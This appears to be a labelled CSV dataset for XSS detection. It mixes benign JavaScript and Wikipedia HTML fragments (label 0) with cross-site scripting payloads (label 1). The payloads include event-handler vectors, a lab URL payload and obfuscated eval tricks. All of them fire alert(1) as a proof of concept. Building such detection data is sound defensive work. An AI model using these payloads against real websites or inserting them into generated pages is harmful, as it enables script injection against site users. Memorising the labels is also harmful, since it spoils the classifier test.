payload,label
this._scrollbar.hide(); document.body.classlist.add(class_name_open); this._adjustdialog();,0
const class_name_slide = 'slide'; const class_name_end = 'carousel-item-end'; const class_name_start = 'carousel-item-start';,0
<picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>,1
"<body onmouseup=""alert(1)"">test</body>",1
<button onpointerover=alert(1)>xss</button>,1
"value: function gotoyear(year) { if (!isnan(year)) { this.calendars[0].year = parseint(year, 10);",0
return } if (this._eventispointerpentouch(event)) {,0
scrollparents.foreach(function (scrollparent) {,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><select id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></select>",1
"} else if (spacedname.indexof("" "" + c + "" "")) { v.classname += "" "" + c; }",0
"v.classname = v.classname.replace(c, """"); } }",0
"<acronym onbeforepaste=""alert(1)"" contenteditable>test</acronym>",1
"m.checkpossiblealignments = function (el, container, bounding, offset) {",0
"<script> object.prototype.src = ['data:,alert(1)//'] </script> <script> $.getscript('https://google.com/') </script>",1
"to = math.min(to, reference[handlenumber + 1] - options.margin)",0
"<style>:target {color:red;}</style><img id=x style=""transition:color 1s"" ontransitionend=alert(1)></img>",1
this._activetarget = null; this._clearactiveclass(targetelement(entry)); continue;,0
this.offsetx = 40; } this._setupeventhandlers();,0
"<li class=""toctree-l1""><a class=""reference internal"" href=""versioning.html"">versioning and api stability</a></li>",0
_handleinputclick() { if (this.dropdown && this.dropdown.isopen) { this._setvaluetoinput();,0
<element onblur=alert(1) tabindex=1 id=x></element><input autofocus>,1
"element.setattribute(name, value === true ? '' : value); } });",0
"<li><a href=""/wiki/hilbert%27s_program"" title=""hilbert&#39;s program"">hilbert's program </a><span class=""nowrap"">&#160;",0
function s4() { return math.floor((1 + math.random()) * 0x10000) .tostring(16),0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><body id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></body>",1
"<li><a href=""/wiki/harmony_search"" class=""mw-redirect"" title=""harmony search"">harmony search </a> </li>",0
var _element$ownerdocumen; if (list === void 0) { list = [];,0
"<nextid draggable=""true"" ondragleave=""alert(1)"">test</nextid>",1
_this19.close(); } });,0
"https://portswigger-labs.net/xss/xss.php?x=%3cscript%3ename=%27alert(1)%27;location=%27//subdomain1.portswigger-labs.net/xss/xss.php?x=%3csvg%20onload=%22attributes[0].value=name,new%20onload%22%3e%27;%3c/script%3e",1
"<dt><a class=""reference internal"" href=""topics/loaders.html""><span class=""doc"">item loaders",0
function getuastring() { var uadata = navigator.useragentdata; if (uadata != null && uadata.brands && array.isarray(uadata.brands)) {,0
"return '<td class=""is-empty""></td>'; } }",0
return false } if (value === number(value).tostring()) {,0
background:,0
value: function dismissall() {,0
"var dragdirection = totaldeltax > 0 ? 'right' : 'left'; totaldeltax = math.min(this._width, math.abs(totaldeltax)); if (this.options.edge !== dragdirection) {",0
"<nobr onmouseleave=""alert(1)"">test</nobr>",1
"<abbr onmouseover=""alert(1)"">test</abbr>",1
"const defaulttype$1 = { offset: '(number|null)', rootmargin: 'string',",0
"<marquee onmouseenter=""alert(1)"">test</marquee>",1
if (!content) { templateelement.remove(); return;,0
"<footer onmouseenter=""alert(1)"">test</footer>",1
"key: ""_handledocumentclickend"", value: function _handledocumentclickend(e) { var _this58 = this;",0
"constructor(el, options) { super(slider, el, options); this.el.m_slider = this;",0
"this.$input[0].removeeventlistener('keydown', this._handleinputkeydownbound); } _handlechipclick(e) {",0
"document.queryselectorall('[data-bs-toggle=""tooltip""]')",0
let domelem = !!el.jquery ? el[0] : el; return domelem.m_tabs; },0
"this.el.style.transform = ""translatex("" + transformx + ""px)""; this._overlay.style.opacity = this.percentopen; }",0
if (!parentscrolltop) {,0
<strike id=x tabindex=1 onbeforeactivate=alert(1)></strike>,1
if (!new regexp(expectedtypes).test(valuetype)) {,0
"<div draggable=""true"" contenteditable>drag me</div><address ondragover=alert(1) contenteditable>drop here</address>",1
"<tr draggable=""true"" ondragenter=""alert(1)"">test</tr>",1
"_settabsandtabwidth() { this.tabswidth = this.$el.width(); this.tabwidth = math.max(this.tabswidth, this.el.scrollwidth) / this.$tablinks.length;",0
"<nobr onmouseout=""alert(1)"">test</nobr>",1
"this.$img[0].removeeventlistener('load', this._handleimageloadbound); if (parallax._parallaxes.length === 0) { window.removeeventlistener('scroll', parallax._handlescrollthrottled);",0
"<style>@keyframes slidein {}</style><legend style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></legend>",1
if (!!toast._draggedtoast) { e.preventdefault(); var toast = toast._draggedtoast;,0
"rightcallback: () => this._slide(this._directiontoorder(direction_right)),",0
if ( entry === true || entry === false ) { for ( i = 1; i < parsed.handles; i++ ) { connect.push(entry);,0
"$('input#search').on('keyup', debounce(function (e) {",0
"<var oncopy=""alert(1)"" contenteditable>test</var>",1
"anim({ targets: this.el, translatex: [`${slideoutpercent * 100}%`, `${endpercent * 105}%`],",0
<col id=x tabindex=1 onfocus=alert(1)></col>,1
"<basefont onkeydown=""alert(1)"" contenteditable>test</basefont>",1
var docel = doc.documentelement; fn.extend({ position: function () {,0
"<style>@keyframes x{}</style><details style=""animation-name:x"" onanimationend=""alert(1)""></details>",1
} else if ($target.closest('.month-prev').length) {,0
<marquee onstart=alert(1)></marquee>,1
$('.tooltipped').tooltip(),0
import backdrop from './util/backdrop.js' import { enabledismisstrigger } from './util/component-functions.js' import focustrap from './util/focustrap.js',0
this._element.style.overflowy = 'hidden' } this._element.classlist.add(class_name_static),0
<i id=x tabindex=1 ondeactivate=alert(1)></i><input id=y autofocus>,1
"} } _this62.$indicators = $('<ul class=""indicators""></ul>');",0
"</span> <span class=""toctext"">technological singularity",0
"prop: function (name, value) { if (isstring(name)) { return (value === undefined ? this[0][name] : this.each(function (v) {",0
scroll: false }; const defaulttype$5 = {,0
this.options.top <= scrolled &&,0
"document.body.style.cursor = ''; document.body.removeeventlistener('selectstart', document.body.nouilistener); }",0
"this._element.classlist.remove(class_name_show) this._element.setattribute('aria-expanded', 'false') manipulator.removedataattribute(this._menu, 'popper')",0
<slot onpointerdown=alert(1)>xss</slot>,1
<figcaption onpointerleave=alert(1)>xss</figcaption>,1
_this67._calculatepositioning(),0
tick.css({ left: this.options.dialradius +,0
<input4 onpointerover=alert(1)>xss</input4>,1
} } _animateimagein() {,0
if ( $(e.target).is($('.card-reveal .card-title')) || $(e.target).is($('.card-reveal .card-title i')),0
var isbaseplacement = baseplacement === preferredplacement,0
if (typeof value !== 'string') {,0
<sup onpointermove=alert(1)>xss</sup>,1
<object onpointerup=alert(1)>xss</object>,1
"<var onkeyup=""alert(1)"" contenteditable>test</var>",1
"<frameset draggable=""true"" ondragstart=""alert(1)"">test</frameset>",1
"<wbr oncontextmenu=""alert(1)"">test</wbr>",1
_handlemodalcloseclick(e) { let $closetrigger = $(e.target).closest('.modal-close'); if ($closetrigger.length) {,0
this._haskeyboardinteraction = false; this._setlisteners(); },0
"eventhandler.off(element, 'mouseover', noop)",0
<acronym onpointerover=alert(1)>xss</acronym>,1
} _getactiveelem() { return this._getchildren().find(child => this._elemisactive(child)) || null,0
"<dt oncontextmenu=""alert(1)"">test</dt>",1
element = index_js.getelement(element); if (!element) { return;,0
"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 18 </li> </ul>",0
const escape_key$2 = 'escape',0
<svg><param onload=alert(1)></param>,1
<xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>,1
"<picture onkeyup=""alert(1)"" contenteditable>test</picture>",1
"<rb draggable=""true"" ondragleave=""alert(1)"">test</rb>",1
if (canalign.spaceonbottom < 0) {,0
<body id=x tabindex=1 onbeforedeactivate=alert(1)></body><input autofocus>,1
"} instancemap.set(key, instance) },",0
const popper = object.freeze( object.defineproperty({,0
const event_show$2 = 'show',0
"<nobr onbeforepaste=""alert(1)"" contenteditable>test</nobr>",1
"this._handleindicatorclickbound = this._handleindicatorclick.bind(this); this.$indicators.find('.indicator-item').each((el, i) => { el.addeventlistener('click', this._handleindicatorclickbound);",0
this.dropdown.open(),0
"<legend onmousedown=""alert(1)"">test</legend>",1
"if ($target.hasclass('datepicker-day-button') && !$target.hasclass('is-empty') && !$target.parent().hasclass('is-disabled')) { this.setdate(new date(e.target.getattribute('data-year'), e.target.getattribute('data-month'), e.target.getattribute('data-day'))); if (this.options.autoclose) {",0
"<style>:target {color: red;}</style><base id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></base>",1
"<li draggable=""true"" ondragenter=""alert(1)"">test</li>",1
"href: 'http://materializecss.com/checkboxes.html',",0
static _handlechipskeyup(e) { chips._keydown = false; },0
<s id=x tabindex=1 onbeforeactivate=alert(1)></s>,1
"<footer draggable=""true"" ondragenter=""alert(1)"">test</footer>",1
"<style>:target {color: red;}</style><multicol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></multicol>",1
"<style>@keyframes x{}</style><big style=""animation-name:x"" onanimationstart=""alert(1)""></big>",1
"<nextid onmousedown=""alert(1)"">test</nextid>",1
<ul onblur=alert(1) tabindex=1 id=x></ul><input autofocus>,1
<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>,1
"this.close(); } }, {",0
"<li><a href=""#citerefpoolemackworthgoebel1998"">poole, mackworth &amp; goebel 1998 </a>, pp.&#160;298–305 </li>",0
"'touchstart', this._handlecontainermousedownandtouchstartbound );",0
if ( decrement !== null && decrement !== false ) { decrement = number(decrement.tofixed(stepdecimals)); },0
"<ul onmousedown=""alert(1)"">test</ul>",1
"<style>:target {color:red;}</style><li id=x style=""transition:color 1s"" ontransitionend=alert(1)></li>",1
"name: 'stackblitz-config-replacer', transform(code, id) { if (id.includes('stackblitz.js')) {",0
return v.innerhtml = source,0
<plaintext onpointerleave=alert(1)>xss</plaintext>,1
"<kbd onkeypress=""alert(1)"" contenteditable>test</kbd>",1
<script>'alert\x281\x29'instanceof{[symbol.hasinstance]:eval}</script>,1
"<li><a href=""/wiki/cross-validation_(statistics)"" title=""cross-validation (statistics)"">cross-validation </a> </li> </ul>",0
"this.currentview = view; $(this.spanhours).toggleclass('text-primary', ishours); $(this.spanminutes).toggleclass('text-primary', !ishours);",0
<form onsubmit=alert(1)><input type=submit>,1
value: function _handleinputkeydown(e) {,0
"<style>@keyframes x{}</style><var style=""animation-name:x"" onanimationend=""alert(1)""></var>",1
"<var draggable=""true"" ondragleave=""alert(1)"">test</var>",1
"}, children(element, selector) { return [].concat(...element.children).filter(child => child.matches(selector));",0
"<ol oncopy=""alert(1)"" contenteditable>test</ol>",1
"tests[name].t( parsed, options[name] === undefined ? defaults[name] : options[name] )",0
"this._element.classlist.add(class_name_collapse, class_name_show); this._element.style[dimension] = ''; eventhandler.trigger(this._element, event_shown);",0
"this._handlecarouselclickbound = this._handlecarouselclick.bind(this); if (typeof window.ontouchstart !== 'undefined') { this.el.addeventlistener('touchstart', this._handlecarouseltapbound);",0
"<style>:target {transform: rotate(180deg);}</style><p id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></p>",1
"<style>:target {color: red;}</style><listing id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></listing>",1
<dialog id=x tabindex=1 onfocusin=alert(1)></dialog>,1
"fn.extend({ serialize: function () { var query = """";",0
var proposal = (movement * 100) / data.basesize,0
"this.$inputfield.append(this.container); this.el.setattribute('data-target', this.container.id); this.dropdown = m.dropdown.init(this.el, {",0
if (value === number(value).tostring()) {,0
const class_name_collapsing = 'collapsing',0
"<aside onmouseenter=""alert(1)"">test</aside>",1
<option onpointerenter=alert(1)>xss</option>,1
"<style>@keyframes x{}</style><multicol style=""animation-name:x"" onanimationend=""alert(1)""></multicol>",1
<multicol onpointerup=alert(1)>xss</multicol>,1
"this.set(newindex); } }], [{",0
<svg><code onload=alert(1)></code>,1
"return h.fnc(a) ? a(c.target, c.id, c.total) : a",0
var text = el.text().trim(); this.el.value = text; this.$el.trigger('change');,0
"position: state.options.strategy, adaptive: adaptive, roundoffsets: roundoffsets",0
this.modal.destroy(); $(this.modalel).remove(); this.destroyselects();,0
"<area onbeforecopy=""alert(1)"" contenteditable>test</area>",1
"anim({ targets: this.$slides.first()[0], opacity: 1,",0
"<u onmouseleave=""alert(1)"">test</u>",1
"manipulator.setdataattribute(this._menu, 'popper', 'static') // todo: v6 remove",0
"</span> <span class=""reference-text""><cite class=""citation journal"">prakken, henry (31 august 2017). ""on the problem of making autonomous vehicles conform to traffic law"". <i>artificial intelligence and law </i>. <b>25 </b> (3): 341–363. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2fs10506-017-9210-0"">10.1007/s10506-017-9210-0 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=artificial+intelligence+and+law&amp;rft.atitle=on+the+problem+of+making+autonomous+vehicles+conform+to+traffic+law&amp;rft.volume=25&amp;rft.issue=3&amp;rft.pages=341-363&amp;rft.date=2017-08-31&amp;rft_id=info%3adoi%2f10.1007%2fs10506-017-9210-0&amp;rft.aulast=prakken&amp;rft.aufirst=henry&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
"<header onmouseleave=""alert(1)"">test</header>",1
"<pre onbeforepaste=""alert(1)"" contenteditable>test</pre>",1
</span>(1918) </li>,0
"<a href=""//www.google.com/""></a>",1
"<var draggable=""true"" ondragstart=""alert(1)"">test</var>",1
newx = offset; } else if (edges.right) { newx -= newx + width - window.innerwidth;,0
this._removeeventhandlers(); this.el.removeattribute('style'); this.$overlay.remove();,0
"return h.obj(a) && a.hasownproperty(""totallength"")",0
"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/theory_of_computation"" title=""theory of computation"">theory of computation </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
<shadow id=x tabindex=1 ondeactivate=alert(1)></shadow><input id=y autofocus>,1
} else { this._scroll(this.target); },0
<optgroup onpointerup=alert(1)>xss</optgroup>,1
"<bdo onpaste=""alert(1)"" contenteditable>test</bdo>",1
"popperrect = _ref2.popperrect,",0
"<h3><span class=""mw-headline"" id=""government"">government",0
constructor() { this._element = document.body },0
"<kbd oncontextmenu=""alert(1)"">test</kbd>",1
"var referencerect = state.rects.reference; var popperrect = state.rects.popper; var tetheroffsetvalue = typeof tetheroffset === 'function' ? tetheroffset(object.assign({}, state.rects, {",0
}; const name$f = 'alert'; const data_key$a = 'bs.alert';,0
"<li><a href=""/wiki/constructivist_epistemology"" title=""constructivist epistemology"">constructivist epistemology </a> </li>",0
row = []; datepicker._settostartofday(now); if (opts.firstday > 0) {,0
"<ul><li><a href=""#citerefturing1950"">turing 1950 </a> under ""(2) the mathematical objection"" </li>",0
"</span>"". <i>science fiction studies </i>. <b>24 </b> (3): 413–429. <a href=""/wiki/jstor"" title=""jstor"">jstor </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.jstor.org/stable/4240644"">4240644 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=science+fiction+studies&amp;rft.atitle=entering+the+posthuman+collective+in+philip+k.+dick%27s+%22do+androids+dream+of+electric+sheep%3f%22&amp;rft.volume=24&amp;rft.issue=3&amp;rft.pages=413-429&amp;rft.date=1997-01-01&amp;rft_id=%2f%2fwww.jstor.org%2fstable%2f4240644&amp;rft.aulast=galvan&amp;rft.aufirst=jill&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
"<script>throw{},onerror=uncaught=eval,h=location.hash,e={linenumber:1,columnnumber:1,filename:0,message:h[2]+h[1]+h},!!window.installtrigger?e:e.message</script>",1
"<style>@keyframes x{}</style><col style=""animation-name:x"" onanimationstart=""alert(1)""></col>",1
<option id=x tabindex=1 onactivate=alert(1)></option>,1
"<embed src=""javascript:alert(1)"">",1
"<script>myundeffunction(13,37);var inject=""injection_starts_here"";function myundeffunction(){};alert(1);//"";</script>",1
"<label onmouseover=""alert(1)"">test</label>",1
"<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, pp.&#160;908–915 </li> </ul>",0
"<style>:target {color: red;}</style><hgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></hgroup>",1
var checksmap = new map(); var makefallbackchecks = true; var firstfittingplacement = placements[0];,0
<hr onpointerup=alert(1)>xss</hr>,1
"<style draggable=""true"" ondrag=""alert(1)"">test</style>",1
"if ( ordered.length && typeof ordered[0][0] === ""object"" ) { ordered.sort(function(a, b) { return a[0][0] - b[0][0]; }); } else {",0
"<b draggable=""true"" ondragenter=""alert(1)"">test</b>",1
this.isvalidlength = actuallength <= maxlength,0
getdata() { return this.chipsdata; },0
"<element onbeforepaste=""alert(1)"" contenteditable>test</element>",1
"<isindex onkeydown=""alert(1)"" contenteditable>test</isindex>",1
<script>navigation.navigate('javascript:alert(1)')</script>,1
"<meta onmousedown=""alert(1)"">test</meta>",1
"<li><cite id=""citerefminsky1967"" class=""citation book""><a href=""/wiki/marvin_minsky"" title=""marvin minsky"">minsky, marvin </a> (1967). <span class=""cs1-lock-registration"" title=""free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/computationfinit0000mins""><i>computation: finite and infinite machines </i> </a>",0
<colgroup onpointermove=alert(1)>xss</colgroup>,1
"currentnode = currentnode.host; } while (ishtmlelement(currentnode) && ['html', 'body'].indexof(getnodename(currentnode)) < 0) {",0
this._isshown = false this._element.classlist.add(class_name_hiding) this._backdrop.hide(),0
let top = this.$el.offset().top; let scrolltop = m.getdocumentscrolltop(); let windowheight = window.innerheight;,0
if ( e.type.indexof('mspointer') === 0 ) { pointer = true; },0
"<style>@keyframes slidein {}</style><address style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></address>",1
const entryislowerthanprevious = entry.target.offsettop >= this._previousscrolldata.visibleentrytop; if (userscrollsdown && entryislowerthanprevious) { activate(entry);,0
"<audio controls autoplay onratechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
<details onpointerenter=alert(1)>xss</details>,1
"<font draggable=""true"" ondragstart=""alert(1)"">test</font>",1
function getclosesthandle ( proposal ) { var closest = 100; var handlenumber = false;,0
<video onwebkitplaybacktargetavailabilitychanged=alert(1)>,1
export function stackblitzplugin() {,0
<noscript onpointerup=alert(1)>xss</noscript>,1
const items = this._getitems() if (index > items.length - 1 || index < 0) { return,0
"overlay.classlist.add('sidenav-overlay'); overlay.addeventlistener('click', this._closebound); document.body.appendchild(overlay);",0
} parsed.limit = parsed.spectrum.getmargin(entry); if ( !parsed.limit || parsed.handles < 2 ) {,0
"<html oncut=""alert(1)"" contenteditable>test</html>",1
"<bdo onclick=""alert(1)"">test</bdo>",1
if (this._isshown && !this._istransitioning) {,0
"<style>:target {transform: rotate(180deg);}</style><font id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></font>",1
<aside id=x tabindex=1 onactivate=alert(1)></aside>,1
}; } _removeeventhandlers() {,0
"<script>throw[onerror]=[alert],1</script>",1
"<li id=""cite_note-:1-290""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-:1_290-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-:1_290-1""><sup><i><b>b </b> </i> </sup> </a>",0
this.$overlay[0].style.zindex = 1000 + modal._modalsopen * 2; this.el.style.zindex = 1000 + modal._modalsopen * 2 + 1; this._openingtrigger = !!$trigger ? $trigger[0] : undefined;,0
"var baseplacement = getbaseplacement(state.placement); var axis = getmainaxisfromplacement(baseplacement); var isvertical = [left, right].indexof(baseplacement) >= 0;",0
<track onpointermove=alert(1)>xss</track>,1
"return day === 0 || day === 6; } }, {",0
const selector_visible_items = '.dropdown-menu .dropdown-item:not(.disabled):not(:disabled)'; const placement_top = isrtl() ? 'top-end' : 'top-start'; const placement_topend = isrtl() ? 'top-start' : 'top-end';,0
"<dl draggable=""true"" ondrag=""alert(1)"">test</dl>",1
for (const selector of selectorengine.find(open_selector)) { offcanvas.getorcreateinstance(selector).show() },0
<svg><sup onload=alert(1)></sup>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><section id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></section>",1
<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>,1
} _toggleentryfromarray(key) { let notadded = !this._keysselected.hasownproperty(key);,0
"<basefont onpaste=""alert(1)"" contenteditable>test</basefont>",1
"this.el.removeeventlistener('mouseup', this._handlerangemouseuptouchendbound); this.el.removeeventlistener('touchend', this._handlerangemouseuptouchendbound); this.el.removeeventlistener('blur', this._handlerangeblurmouseouttouchleavebound);",0
"<option oncopy=""alert(1)"" contenteditable>test</option>",1
"<col onkeyup=""alert(1)"" contenteditable>test</col>",1
this._lasttabnavdirection = event.shiftkey ? tab_nav_backward : tab_nav_forward; } },0
if (isrtl()) { return direction === direction_left ? order_prev : order_next; },0
"b = { type: c, property: b.name, animatable: a, tweens: d, duration: d[d.length - 1].end, delay: d[0].delay }",0
const parentdropdown = this._parent; if (parentdropdown.classlist.contains(class_name_dropend)) { return placement_right;,0
_this21.el.m_parallax = _this21,0
"key: ""_ondragstart"", value: function _ondragstart(e) { if (e.target && $(e.target).closest('.toast').length) {",0
<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><meter ondrop=alert(1) contenteditable>drop here</meter>",1
"<li><a href=""#citerefcrevier1993"">crevier 1993 </a>, pp.&#160;258–263 </li> </ul>",0
"<textarea draggable=""true"" ondragleave=""alert(1)"">test</textarea>",1
"merge: function (first, second) { var len = +second.length, i = first.length,",0
let lasttick = scrollspy.tickid; if (lasttick < 0) { scrollspy._enter();,0
"addclass(element, classname)",0
.eq(diff)[0] .classlist.add('active'); },0
} _handlemouseenter() { this.ishovered = true;,0
"<track onkeydown=""alert(1)"" contenteditable>test</track>",1
_this62.images = []; _this62.itemwidth = _this62.$el.find('.carousel-item').first().innerwidth(); _this62.itemheight = _this62.$el.find('.carousel-item').first().innerheight();,0
"} return { x: element.offsetleft,",0
<iframe onreadystatechange=alert(1)></iframe>,1
} if (verticalalignment === 'bottom') { idealypos = idealypos - dropdownbrect.height + (this.options.covertrigger ? triggerbrect.height : 0);,0
<spacer onblur=alert(1) tabindex=1 id=x></spacer><input autofocus>,1
return node instanceof ownelement || node instanceof shadowroot,0
if (state.reset === true) {,0
context._activetrigger[event.type === 'focusout' ? trigger_focus : trigger_hover] = context._element.contains(event.relatedtarget) context._leave(),0
"<dialog onkeydown=""alert(1)"" contenteditable>test</dialog>",1
"let opts = this.options, now = new date(), days = datepicker._getdaysinmonth(year, month),",0
"}, this._dialog) }, this._dialog) this._element.focus()",0
"dropdownoptions: { container: document.body, constrainwidth: false } }); m.formselect.init(monthselect, {",0
<option onpointerleave=alert(1)>xss</option>,1
"<style>@keyframes x{}</style><* style=""animation-name:x"" onanimationstart=""alert(1)""></*>",1
"selector: false, template: '<div class=""tooltip"" role=""tooltip"">' + '<div class=""tooltip-arrow""></div>' + '<div class=""tooltip-inner""></div>' + '</div>', title: '',",0
"<head onpaste=""alert(1)"" contenteditable>test</head>",1
<big id=x tabindex=1 ondeactivate=alert(1)></big><input id=y autofocus>,1
"<p>intelligent agents must be able to set goals and achieve them.<sup id=""cite_ref-planning_110-0"" class=""reference""><a href=""#cite_note-planning-110"">&#91;107&#93; </a> </sup> they need a way to visualize the future—a representation of the state of the world and be able to make predictions about how their actions will change it—and be able to make choices that maximize the <a href=""/wiki/utility"" title=""utility"">utility </a> (or ""value"") of available choices.<sup id=""cite_ref-information_value_theory_111-0"" class=""reference""><a href=""#cite_note-information_value_theory-111"">&#91;108&#93; </a> </sup>",0
"return ispercentage([va, vb], (value - pa) * subrangeratio (pa, pb)); } function getstep ( xpct, xsteps, snap, value ) {",0
"<font onmouseenter=""alert(1)"">test</font>",1
} if (this.options.toolbarenabled) { this._animateintoolbar();,0
<tr onpointerout=alert(1)>xss</tr>,1
<mark onpointerleave=alert(1)>xss</mark>,1
"'background-color': '', transform: 'translate3d(' + -this.offsetx + 'px,0,0)' });",0
"key: ""_setupactivetablink"", value: function _setupactivetablink() { this.$activetablink = $(this.$tablinks.filter('[href=""' + location.hash + '""]'));",0
"this._element.classlist.add(class_name_show$3); this._element.classlist.remove(class_name_showing$1); eventhandler.trigger(this._element, event_shown$3, {",0
"<style>@keyframes slidein {}</style><frame style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></frame>",1
switch (variation) {,0
if (this.nowrap) { if (this.target >= this.dim * (this.count - 1)) { this.target = this.dim * (this.count - 1);,0
"}return b; }(), ha = { css: function (a, c, d) {",0
"<blockquote onmouseleave=""alert(1)"">test</blockquote>",1
